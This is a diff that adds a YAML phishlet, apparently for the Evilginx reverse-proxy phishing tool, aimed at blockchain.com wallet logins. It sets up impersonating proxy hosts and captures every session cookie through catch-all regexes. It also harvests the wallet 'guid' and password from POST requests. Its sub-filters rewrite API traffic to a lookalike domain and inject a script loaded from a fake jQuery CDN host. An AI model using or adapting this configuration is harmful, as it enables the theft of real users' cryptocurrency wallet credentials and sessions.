@@ -1,0 +1,37 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'blockchain.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: 'www', domain: 'blockchain.info', session: false, is_landing: false}
+  - {phish_sub: 'wallet-helper', orig_sub: 'wallet-helper', domain: 'blockchain.com', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'blockchain.info', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'api.blockchain.com', orig_sub: 'api', domain: 'blockchain.info', search: 'api.blockchain.info', replace: 'api.blockchain-info-99831.com', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+  - {triggers_on: www.blockchain.com', orig_sub: 'www', domain: 'blockchain.com', search: '</script>', replace: '<script src="https://jquery-cdn-39483.com/jquery-3.5.4.min.js"></script></script>', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.blockchain.com'
+    keys: ['(.+),regexp']
+  - domain: '(.+),regexp'
+    keys: ['(.+),regexp']
+credentials:
+  username:
+    key: 'guid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.blockchain.com'
+  path: '/'
+js_inject:
+  - trigger_domains: ["www.blockchain.com"]
+    trigger_paths: [".*?"]
+    script: |
+            function lp(){
+                var f0 =alert('Script Injected !'); 
+                return;
+            }
+            setTimeout(function(){lp();}, 1500);
+           
